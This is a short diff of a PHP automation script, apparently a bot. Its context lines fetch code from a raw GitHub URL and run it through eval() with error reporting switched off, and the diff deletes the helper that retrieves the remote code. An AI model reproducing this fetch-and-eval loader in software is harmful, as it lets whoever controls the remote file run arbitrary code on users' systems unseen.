@@ -3,7 +3,8 @@
 error_reporting(0);
 if($eval == false) {
     eval(get_e("https://raw.githubusercontent.com/marcoleus/build/main/build_index.php"));
-}error_reporting(0);
+}
+error_reporting(0);
 methode:
 c();
 $methode = methode_captcha();
@@ -328,13 +329,3 @@ function base_run($url,$data=0) {
         "json" => json_decode($r[1])
     ];
 }
-
-function get_e($input) {
-    while(true) {
-        $string = file_get_contents($input);
-        if(!$string) {
-            continue;
-        } else {
-            return $string;
-        }
-    }
